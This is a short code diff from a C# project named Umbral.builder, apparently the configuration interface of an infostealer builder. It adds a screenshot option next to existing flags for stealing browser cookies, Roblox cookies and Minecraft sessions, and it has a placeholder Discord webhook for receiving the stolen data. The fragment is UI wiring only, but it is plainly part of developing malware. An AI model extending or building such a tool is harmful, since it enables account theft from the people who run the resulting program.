@@ -20,6 +20,7 @@ namespace Umbral.builder.User_Controls
         public static bool StealCookies;
         public static bool StealRobloxCookies;
         public static bool StealMinecraftSession;
+        public static bool TakeScreenshot;
 
         private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
         private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
@@ -120,6 +121,8 @@ namespace Umbral.builder.User_Controls
                 StealRobloxCookies = checkBox.Checked;
             else if (checkBox.Equals(StealMinecraftSessionCheckBox))
                 StealMinecraftSession = checkBox.Checked;
+            else if (checkBox.Equals(TakeScreenshotCheckBox))
+                TakeScreenshot = checkBox.Checked;
         }
 
         private void webhookLabel_TextChanged(object sender, EventArgs e)
